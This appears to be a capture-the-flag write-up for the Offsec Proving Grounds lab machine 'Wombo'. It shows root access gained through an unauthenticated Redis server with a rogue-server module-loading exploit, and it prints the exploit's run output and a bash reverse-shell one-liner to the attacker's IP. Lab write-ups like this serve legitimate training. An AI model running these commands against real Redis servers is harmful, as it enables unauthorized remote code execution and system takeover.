---
title: "Proving grounds Practice: Wombo"
layout: post
date: 2023-10-21 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- RCE
- Redis
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp    open  http       nginx 1.10.3
6379/tcp  open  redis      Redis key-value store 5.0.9
8080/tcp  open  http-proxy
27017/tcp open  mongod?
```

## 6379/tcp - open - redis - Redis key-value store 5.0.9

The redis server is vulnerable to [Remote code Execution](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) vulnerability.

Connect to redis server to check if it is password protected or not.

```sh
naveenj@hackerspace:[09:32]~/proving_grounds/Wombo$ redis-cli -h 192.168.211.69
192.168.211.69:6379> module list
(empty array)
(0.53s)
192.168.211.69:6379> 
```

The server is not password protected, clone the [GitHub](https://github.com/n0b0dyCN/redis-rogue-server) exploit and follow below steps.

After cloning the repository direct to `/redis-rogue-server/RedisModulesSDK/exp` folder and run `sudo make`. The `exp.so` file will be created and copy the file to the folder where the python exploit code is exists.

## Exploitation

```sh
naveenj@hackerspace:[09:53]~/proving_grounds/Wombo/redis-rogue-server$ python redis-rogue-server.py --rhost 192.168.211.69 --rport 6379 --lhost 192.168.45.243 --lport 80 --exp=exp.so -v
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.211.69:6379
[info] SERVER 192.168.45.243:80
[info] Setting master...
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.243\r\n$2\r\n80\r\n'
[->] b'+OK\r\n'
[info] Setting dbfilename...
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[->] b'*1\r\n$4\r\nPING\r\n'
[<-] b'+PONG\r\n'
[->] b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<-] b'+OK\r\n'
[->] b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<-] b'+OK\r\n'
[->] b'*3\r\n$5\r\nPSYNC\r\n$40\r\n73a8ee0c379f25d3a0d876642411d68a61500ca3\r\n$1\r\n1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$47856\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\xb3\x00\x00\x00\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[info] Loading module...
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[->] b'+OK\r\n'
[info] Temerory cleaning up...
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
[->] b'+OK\r\n'
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$11\r\nrm ./exp.so\r\n'
[->] b'$1\r\ne\r\n'
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] id;whoami;
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$10\r\nid;whoami;\r\n'
[->] b'$45\r\n\x08uid=0(root) gid=0(root) groups=0(root)\nroot\n\r\n'
[>>]uid=0(root) gid=0(root) groups=0(root)
[>>] root
```

**Foothold Obtained**

## Reverse Shell

Bash reverse shell.

```sh
bash -c 'sh -i >& /dev/tcp/192.168.45.243/8080 0>&1';
```

Make sure the netcat listener is running.

```sh
veenj@hackerspace:[09:51]~/proving_grounds/Wombo/redis-rogue-server$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.211.69] 54064
sh: 0: can't access tty; job control turned off
# which python
/usr/bin/python
# python -c 'import pty; pty.spawn("/bin/bash")'
root@wombo:/# 
```

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).